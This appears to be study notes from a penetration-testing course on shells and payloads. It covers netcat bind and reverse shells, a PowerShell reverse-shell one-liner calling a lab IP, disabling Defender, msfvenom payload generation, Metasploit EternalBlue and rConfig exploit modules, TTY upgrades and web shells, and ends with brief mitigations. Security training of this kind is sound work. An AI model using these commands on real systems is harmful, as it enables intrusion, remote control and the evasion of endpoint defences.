# Shells & Payloads

## 🎯 Main Idea
- How attackers gain and use interactive command execution on a target: the anatomy of a shell, delivering **payloads** to obtain bind/reverse shells, and leveraging web shells.
- Covers crafting payloads (Metasploit, MSFvenom), infiltrating Windows and Unix/Linux hosts via known exploits, upgrading to interactive shells, and detection/prevention.

## 💥 Attack / Exploit Vectors
### Bind Shells
- Target opens a listening port and binds a shell to it; attacker connects in. Fragile to firewalls/NAT.
- **Commands**
  - `sudo nc -lvnp <port>` — start a netcat listener
  - `nc -nv <target-ip> <port>` — connect to a listener
  - `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f` — netcat FIFO bind shell serving /bin/bash

### Reverse Shells
- Compromised host connects back to the attacker's listener — usually bypasses inbound firewall rules.
- **Commands**
  - `sudo nc -lvnp <port>` — attacker listener to catch the shell
  - `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);...$client.Close()"` — PowerShell reverse-shell one-liner
  - `Set-MpPreference -DisableRealtimeMonitoring $true` — disable Defender real-time monitoring before delivery

### Crafting Payloads with MSFvenom
- Generate standalone stageless/staged payloads in many formats for different OSes and web stacks.
- **Commands**
  - `msfvenom -p linux/x64/shell_reverse_tcp LHOST=.. LPORT=443 -f elf > file.elf` — Linux reverse shell (stageless)
  - `msfvenom -p windows/shell_reverse_tcp LHOST=.. LPORT=443 -f exe > file.exe` — Windows reverse shell
  - `msfvenom -p osx/x86/shell_reverse_tcp LHOST=.. LPORT=443 -f macho > file.macho` — macOS reverse shell
  - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=.. LPORT=443 -f asp > file.asp` — ASP web reverse shell
  - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=.. LPORT=443 -f raw > file.jsp` — JSP web reverse shell
  - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=.. LPORT=443 -f war > file.war` — WAR reverse shell

### Automating with Metasploit
- Use framework modules to deliver payloads and exploit known vulns automatically.
- **Commands**
  - `use exploit/windows/smb/psexec` — SMB/psexec shell on valid-cred Windows hosts
  - `shell` — drop from a meterpreter session into a system shell

### Infiltrating Windows
- Enumerate/fingerprint, then exploit prominent Windows flaws (SMB, RDP, Print Spooler). Payloads as .bat, .dll, .msi.
- Notable exploits: MS08-067 (SMB), **EternalBlue / MS17-010** (SMBv1 RCE), PrintNightmare (Print Spooler RCE), BlueKeep / CVE-2019-0708 (RDP RCE).
- **Commands**
  - `use auxiliary/scanner/smb/smb_ms17_010` — check if host is vulnerable to MS17-010
  - `use exploit/windows/smb/ms17_010_psexec` (or `ms17_010_eternalblue`) — get a reverse shell on an EternalBlue-vulnerable host

### Infiltrating Unix/Linux
- Gain a shell by attacking a vulnerable web application (version-fingerprint → find CVE/PoC → exploit).
- Example: rConfig 3.9.6 arbitrary file upload → RCE.
- **Commands**
  - `use exploit/linux/http/rconfig_vendors_auth_file_upload_rce` — reverse shell on vulnerable rConfig 3.9.6

### Spawning Interactive (TTY) Shells
- Upgrade a dumb/non-interactive shell to a full TTY; also used to escape restricted "jail" shells.
- **Commands**
  - `python -c 'import pty; pty.spawn("/bin/sh")'` — spawn a TTY with Python
  - `/bin/sh -i` — interactive shell
  - `perl -e 'exec "/bin/sh";'` — Perl interactive shell
  - `ruby: exec "/bin/sh"` / `Lua: os.execute('/bin/sh')` — Ruby/Lua interactive shell
  - `awk 'BEGIN {system("/bin/sh")}'` — AWK interactive shell
  - `find . -exec /bin/sh \; -quit` — shell via find -exec
  - `vim -c ':!/bin/sh'` — shell via VIM (jail-shell escape)
  - `ls -la <path>` / `sudo -l` — check binary permissions and sudo rights for escalation paths

### Web Shells
- Upload a server-side script (ASP/ASPX/PHP/JSP) that executes OS commands through the web server.
- **Commands**
  - `/usr/share/webshells/laudanum` — Laudanum web shells (ASP/ASPX/PHP/JSP) location
  - `/usr/share/nishang/Antak-WebShell` — Antak (ASPX) web shell location

## 🛠️ Key Tools & Concepts
- `netcat`/`ncat` — listeners, bind & reverse shells
- `msfvenom` — multi-format payload generation (staged vs stageless)
- `Metasploit` / `meterpreter` — exploit delivery, psexec, ms17_010, rConfig modules
- `xfreerdp` — RDP client access to Windows targets
- `env` — identify the in-use shell/interpreter language
- Interpreters for TTY upgrade: Python/Perl/Ruby/Lua/AWK/find/VIM
- Web shells: Laudanum, Antak (Nishang)
- Shell anatomy: command-language interpreters, terminal emulators; staged vs stageless payloads

## 🛡️ Mitigations
- Application sandboxing to limit blast radius of a compromised app.
- Least-privilege permission policies (avoid unnecessary admin/domain-admin).
- Host segmentation & hardening (DMZ for internet-facing hosts, STIG guides).
- Physical and application-layer firewalls with strict inbound/outbound rules (NAT can break shell payloads).
- Endpoint protection, network visibility/monitoring, and watching for suspicious process/shell events.
